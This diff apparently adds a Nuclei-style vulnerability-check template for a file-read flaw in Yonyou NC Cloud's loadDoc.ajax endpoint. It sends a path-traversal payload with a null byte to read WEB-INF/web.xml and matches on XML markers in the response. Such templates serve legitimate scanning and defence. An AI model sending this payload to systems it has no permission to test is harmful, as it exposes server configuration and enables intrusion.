@@ -1,0 +1,30 @@
+id: yongyouNC-Cloud-loadDoc_ajax-File-reading
+
+info:
+  name: yongyouNC-Cloud-loadDoc_ajax-File-reading
+  author: xxx
+  severity: high
+  tags: File reading
+
+http:
+  - raw:
+      - |
+        POST /uapws/loadDoc.ajax HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36(KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
+        Content-Type: application/x-www-form-urlencoded
+
+        ws=../../WEB-INF/web.xml%00
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '<?xml version='
+          - '<web-app'
+          - '</web-app>'
+          - '</context-param>'
+        condition: and
+      - type: status
+        status: 
+          - 200
